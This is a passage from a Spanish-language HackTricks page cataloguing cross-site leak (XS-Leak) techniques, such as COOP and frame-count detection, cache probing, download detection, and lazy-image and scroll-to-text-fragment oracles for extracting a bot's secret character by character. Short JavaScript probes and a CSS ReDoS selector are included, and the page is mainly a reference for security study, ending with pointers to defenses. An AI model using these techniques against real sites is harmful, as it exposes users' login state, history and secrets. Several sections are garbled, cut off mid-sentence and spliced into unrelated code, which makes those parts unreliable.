* **M√°s informaci√≥n**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumen:** GC y SA permiten verificar el tipo de respuesta (redirecci√≥n opaca) despu√©s de que se complete la redirecci√≥n.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Al enviar una solicitud utilizando la Fetch API con `redirect: "manual"` y otros par√°metros, es posible leer el atributo `response.type` y si es igual a `opaqueredirect`, entonces la respuesta fue una redirecci√≥n.

### COOP

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumen:** Las p√°ginas protegidas por la Pol√≠tica de Apertura de Origen Cruzado (COOP) evitan el acceso desde interacciones de origen cruzado.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un atacante es capaz de deducir la presencia del encabezado de Pol√≠tica de Apertura de Origen Cruzado (COOP) en una respuesta HTTP de origen cruzado. COOP es utilizada por aplicaciones web para impedir que sitios externos obtengan referencias de ventana arbitrarias. La visibilidad de este encabezado se puede discernir intentando acceder a la referencia **`contentWindow`**. En escenarios donde COOP se aplica condicionalmente, la propiedad **`opener`** se convierte en un indicador revelador: es **indefinida** cuando COOP est√° activa, y **definida** en su ausencia.

### Longitud M√°xima de URL - Lado del Servidor

* **M√©todos de Inclusi√≥n**: Fetch API, Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado / Contenido
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumen:** Detecta diferencias en las respuestas debido a que la longitud de la respuesta de redirecci√≥n podr√≠a ser demasiado grande y el servidor responde con un error y se genera una alerta.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si una redirecci√≥n del lado del servidor utiliza **entrada de usuario dentro de la redirecci√≥n** y **datos adicionales**. Es posible detectar este comportamiento porque por lo general los **servidores** tienen un **l√≠mite de longitud de solicitud**. Si los **datos del usuario** tienen esa **longitud - 1**, porque la **redirecci√≥n** est√° usando **esos datos** y **agregando** algo **extra**, desencadenar√° un **error detectable a trav√©s de Eventos de Error**.

Si de alguna manera puedes establecer cookies a un usuario, tambi√©n puedes realizar este ataque **configurando suficientes cookies** ([**bomba de cookies**](hacking-with-cookies/cookie-bomb.md)) para que con el **aumento del tama√±o de la respuesta correcta** se genere un **error**. En este caso, recuerda que si activas esta solicitud desde un mismo sitio, `<script>` enviar√° autom√°ticamente las cookies (as√≠ que puedes verificar los errores).\
Un ejemplo de **bomba de cookies + XS-Search** se puede encontrar en la soluci√≥n prevista de este informe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` o estar en el mismo contexto generalmente es necesario para este tipo de ataque.

### Longitud M√°xima de URL - Lado del Cliente

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: C√≥digo de Estado / Contenido
* **M√°s informaci√≥n**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumen:** Detecta diferencias en las respuestas debido a que la longitud de la respuesta de redirecci√≥n podr√≠a ser demasiado grande para una solicitud que se pueda notar una diferencia.
* **Ejemplo de C√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Seg√∫n la [documentaci√≥n de Chromium](https://chromium.googlesource.com/chromium/src
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteo de Frames

* **M√©todos de Inclusi√≥n**: Frames, Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumen:** Evaluar la cantidad de elementos iframe inspeccionando la propiedad `window.length`.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar el **n√∫mero de frames en una web** abierta mediante `iframe` o `window.open` puede ayudar a identificar el **estado del usuario en esa p√°gina**.\
Adem√°s, si la p√°gina siempre tiene el mismo n√∫mero de frames, verificar **continuamente** el n√∫mero de frames puede ayudar a identificar un **patr√≥n** que podr√≠a filtrar informaci√≥n.

Un ejemplo de esta t√©cnica es que en Chrome, un **PDF** puede ser **detectado** con el **conteo de frames** porque se utiliza internamente un `embed`. Hay [Par√°metros de URL Abierta](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permiten cierto control sobre el contenido como `zoom`, `view`, `page`, `toolbar`, donde esta t√©cnica podr√≠a ser interesante.

### HTMLElements

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumen:** Leer el valor filtrado para distinguir entre 2 estados posibles
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La filtraci√≥n de informaci√≥n a trav√©s de elementos HTML es una preocupaci√≥n en la seguridad web, especialmente cuando se generan archivos multimedia din√°micos basados en informaci√≥n del usuario, o cuando se agregan marcas de agua, alterando el tama√±o del medio. Esto puede ser explotado por atacantes para diferenciar entre estados posibles mediante el an√°lisis de la informaci√≥n expuesta por ciertos elementos HTML.

### Informaci√≥n Expuesta por Elementos HTML

- **HTMLMediaElement**: Este elemento revela los tiempos de `duraci√≥n` y `buffered` del medio, que se pueden acceder a trav√©s de su API.
[Leer m√°s sobre HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Expone `videoHeight` y `videoWidth`. En algunos navegadores, propiedades adicionales como `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` y `webkitDecodedFrameCount` est√°n disponibles, ofreciendo informaci√≥n m√°s detallada sobre el contenido multimedia.
[Leer m√°s sobre HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Esta funci√≥n proporciona detalles sobre la calidad de reproducci√≥n de video, incluyendo `totalVideoFrames`, que puede indicar la cantidad de datos de video procesados.
[Leer m√°s sobre getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Este elemento filtra la `altura` y `ancho` de una imagen. Sin embargo, si una imagen es inv√°lida, estas propiedades devolver√°n 0, y la funci√≥n `image.decode()` ser√° rechazada, indicando la falla al cargar la imagen correctamente.
[Leer m√°s sobre HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propiedad CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumen:** Identificar variaciones en el estilo del sitio web que se correlacionan con el estado del usuario.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Las aplicaciones web pueden cambiar el **estilo del sitio web** dependiendo del estado del usuario. Los archivos CSS de origen cruzado pueden ser incrustados en la p√°gina del atacante con el **elemento de enlace HTML**, y las **reglas** se aplicar√°n a la p√°gina del atacante. Si una p√°gina cambia din√°micamente estas reglas, un atacante puede **detectar** estas **diferencias** dependiendo del estado del usuario.\
Como t√©cnica de filtraci√≥n, el atacante puede usar el m√©todo `window.getComputedStyle` para **leer CSS** propiedades de un elemento HTML espec√≠fico. Como resultado, un atacante puede leer propiedades CSS arbitrarias si se conoce el elemento afectado y el nombre de la propiedad.

### Historial CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumen:** Detectar si se aplica el estilo `:visited` a una URL indicando que ya fue visitada
* **Ejemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Seg√∫n [**esto**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), esto no funciona en Chrome sin cabeza.
{% endhint %}

El selector CSS `:visited` se utiliza para aplicar estilos diferentes a las URL si han sido visitadas previamente por el usuario. En el pasado, el m√©todo `getComputedStyle()` se pod√≠a utilizar para identificar estas diferencias de estilo. Sin embargo, los navegadores modernos han implementado medidas de seguridad para evitar que este m√©todo revele el estado de un enlace. Estas medidas incluyen devolver siempre el estilo calculado como si el enlace hubiera sido visitado y restringir los estilos que se pueden aplicar con el selector `:visited`.

A pesar de estas restricciones, es posible discernir el estado visitado de un enlace de forma indirecta. Una t√©cnica implica enga√±ar al usuario para que interact√∫e con un √°rea afectada por CSS, espec√≠ficamente utilizando la propiedad `mix-blend-mode`. Esta propiedad permite la mezcla de elementos con su fondo, revelando potencialmente el estado visitado en funci√≥n de la interacci√≥n del usuario.

Adem√°s, la detecci√≥n se puede lograr sin interacci√≥n del usuario explotando los tiempos de renderizado de los enlaces. Dado que los navegadores pueden renderizar enlaces visitados y no visitados de manera diferente, esto puede introducir una diferencia de tiempo medible en el renderizado. Se mencion√≥ un ejemplo de concepto (PoC) en un informe de error de Chromium, demostrando esta t√©cnica utilizando m√∫ltiples enlaces para amplificar la diferencia de tiempo, haciendo as√≠ que el estado visitado sea detectable mediante an√°lisis de tiempo.

Para m√°s detalles sobre estas propiedades y m√©todos, visita sus p√°ginas de documentaci√≥n:
- `:visited`: [Documentaci√≥n de MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [Documentaci√≥n de MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [Documentaci√≥n de MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Fuga de X-Frame de ContentDocument

* **M√©todos de Inclusi√≥n**: Frames
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumen:** En Google Chrome, se muestra una p√°gina de error dedicada cuando se bloquea una p√°gina para ser incrustada en un sitio de origen cruzado debido a restricciones de X-Frame-Options.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

En Chrome, si una p√°gina con la cabecera `X-Frame-Options` establecida en "deny" o "same-origin" se incrusta como un objeto, aparece una p√°gina de error. Chrome devuelve de manera √∫nica un objeto de documento vac√≠o (en lugar de `null`) para la propiedad `contentDocument` de este objeto, a diferencia de los iframes u otros navegadores. Los atacantes podr√≠an explotar esto al detectar el documento vac√≠o, revelando potencialmente informaci√≥n sobre el estado del usuario, especialmente si los desarrolladores establecen de manera inconsistente la cabecera X-Frame-Options, a menudo pasando por alto las p√°ginas de error. La conciencia y la aplicaci√≥n consistente de las cabeceras de seguridad son cruciales para prevenir tales filtraciones.

### Detecci√≥n de Descargas

* **M√©todos de Inclusi√≥n**: Frames, Pop-ups
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumen:** Un atacante puede discernir descargas de archivos aprovechando iframes; la accesibilidad continua del iframe implica una descarga de archivo exitosa.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

La cabecera `Content-Disposition`, espec√≠ficamente `Content-Disposition: attachment`, instruye al navegador a descargar el contenido en lugar de mostrarlo en l√≠nea. Este comportamiento puede ser explotado para detectar si un usuario tiene acceso a una p√°gina que desencadena una descarga de archivo. En los navegadores basados en Chromium, existen algunas t√©cnicas para detectar este comportamiento de descarga:

1. **Monitoreo de Barra de Descarga**:
- Cuando se descarga un archivo en los navegadores basados en Chromium, aparece una barra de descarga en la parte inferior de la ventana del navegador.
- Al monitorear los cambios en la altura de la ventana, los atacantes pueden inferir la aparici√≥n de la barra de descarga, lo que sugiere que se ha iniciado una descarga.

2. **Navegaci√≥n de Descarga con Iframes**:
- Cuando una p√°gina desencadena una descarga de archivo usando la cabecera `Content-Disposition: attachment`, no provoca un evento de navegaci√≥n.
- Cargando el contenido en un iframe y monitoreando los eventos de navegaci√≥n, es posible verificar si la disposici√≥n del contenido provoca una descarga de archivo (sin navegaci√≥n) o no.

3. **Navegaci√≥n de Descarga sin Iframes**:
- Similar a la t√©cnica de iframe, este m√©todo implica usar `window.open` en lugar de un iframe.
- Monitorear los eventos de navegaci√≥n en la ventana reci√©n abierta puede revelar si se desencaden√≥ una descarga de archivo (sin navegaci√≥n) o si el contenido se muestra en l√≠nea (ocurre navegaci√≥n).

En escenarios donde solo los usuarios autenticados pueden desencadenar estas descargas, estas t√©cnicas pueden usarse para inferir indirectamente el estado de autenticaci√≥n del usuario en funci√≥n de la respuesta del navegador a la solicitud de descarga.

### Bypass de Cach√© HTTP Particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Tiempo
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumen:** Un atacante puede discernir descargas de archivos aprovechando iframes; la accesibilidad continua del iframe implica una descarga de archivo exitosa.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Por eso esta t√©cnica es interesante: Chrome ahora tiene **particionamiento de cach√©**, y la clave de cach√© de la p√°gina reci√©n abierta es: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, pero si abro una p√°gina de ngrok y uso fetch en ella, la clave de cach√© ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **clave de cach√© es diferente**, por lo que la cach√© no se puede compartir. Puedes encontrar m√°s detalles aqu√≠: [Ganando seguridad y privacidad mediante la partici√≥n de la cach√©](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comentario de [**aqu√≠**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un sitio `ejemplo.com` incluye un recurso de `*.ejemplo.com/recurso` entonces ese recurso tendr√° la **misma clave de cach√©** que si el recurso fuera solicitado directamente a trav√©s de la navegaci√≥n de nivel superior. Esto se debe a que la clave de cach√© est√° compuesta por _eTLD+1_ de nivel superior y _eTLD+1_ del marco.

Dado que acceder a la cach√© es m√°s r√°pido que cargar un recurso, es posible intentar cambiar la ubicaci√≥n de una p√°gina y cancelarla 20ms (por ejemplo) despu√©s. Si el origen cambi√≥ despu√©s de la parada, significa que el recurso estaba en cach√©.\
O simplemente **enviar alg√∫n fetch a la p√°gina potencialmente en cach√© y medir el tiempo que tarda**.

### Redirecci√≥n Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Redirecciones
* **M√°s informaci√≥n**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumen:** Es posible averiguar si una respuesta a una solicitud fetch es una redirecci√≥n
* **Ejemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch con AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Tiempo
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumen:** Es posible intentar cargar un recurso y abortar antes de que se cargue la carga. Dependiendo de si se desencadena un error, el recurso estaba o no en cach√©.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Usa _**fetch**_ y _**setTimeout**_ con un **AbortController** para detectar si el **recurso est√° en cach√©** y para eliminar un recurso espec√≠fico de la cach√© del navegador. Adem√°s, el proceso ocurre sin almacenar en cach√© contenido nuevo.

### Contaminaci√≥n de Script

* **M√©todos de Inclusi√≥n**: Elementos HTML (script
```html
<img src=/something loading=lazy >
```
Por lo tanto, lo que puedes hacer es **agregar una gran cantidad de caracteres basura** (por ejemplo, **miles de "W"**) para **llenar la p√°gina web antes del secreto o agregar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Entonces, si por ejemplo nuestra **inyecci√≥n aparece antes de la bandera**, la **imagen** se **cargar√°**, pero si aparece **despu√©s** de la **bandera**, la bandera + la basura **evitar√°n que se cargue** (tendr√°s que jugar con la cantidad de basura a colocar). Esto es lo que sucedi√≥ en [**este writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Otra opci√≥n ser√≠a usar el **scroll-to-text-fragment** si est√° permitido:

#### Scroll-to-text-fragment

Sin embargo, haces que el **bot acceda a la p√°gina** con algo como
```
#:~:text=SECR
```
Entonces la p√°gina web ser√° algo como: **`https://victima.com/post.html#:~:text=SECR`**

Donde post.html contiene los caracteres basura del atacante y la carga perezosa de la imagen, luego se agrega el secreto del bot.

Lo que este texto har√° es hacer que el bot acceda a cualquier texto en la p√°gina que contenga el texto `SECR`. Como ese texto es el secreto y est√° justo **debajo de la imagen**, la **imagen solo se cargar√° si el secreto adivinado es correcto**. As√≠ que ah√≠ tienes tu or√°culo para **filtrar el secreto car√°cter por car√°cter**.

Algunos ejemplos de c√≥digo para explotar esto: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Tiempo de Carga Perezosa de Im√°genes Basado en el Tiempo

Si **no es posible cargar una imagen externa** que podr√≠a indicar al atacante que la imagen se carg√≥, otra opci√≥n ser√≠a intentar **adivinar el car√°cter varias veces y medir eso**. Si la imagen se carga, todas las solicitudes tomar√≠an m√°s tiempo que si la imagen no se carga. Esto es lo que se us√≥ en la [**soluci√≥n de este informe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqu√≠:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### ReDoS de CSS

Si se utiliza `jQuery(location.hash)`, es posible averiguar a trav√©s del tiempo si existe alg√∫n contenido HTML, esto se debe a que si el selector `main[id='site-main']` no coincide, no es necesario verificar el resto de los **selectores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inyecci√≥n de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defensas

Hay mitigaciones recomendadas en [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tambi√©n en cada secci√≥n del wiki [https://xsleaks.dev/](https://xsleaks.dev/). Echa un vistazo all√≠ para obtener m√°s informaci√≥n sobre c√≥mo protegerse contra estas t√©cnicas.

## Referencias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias **m√°s avanzadas** del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
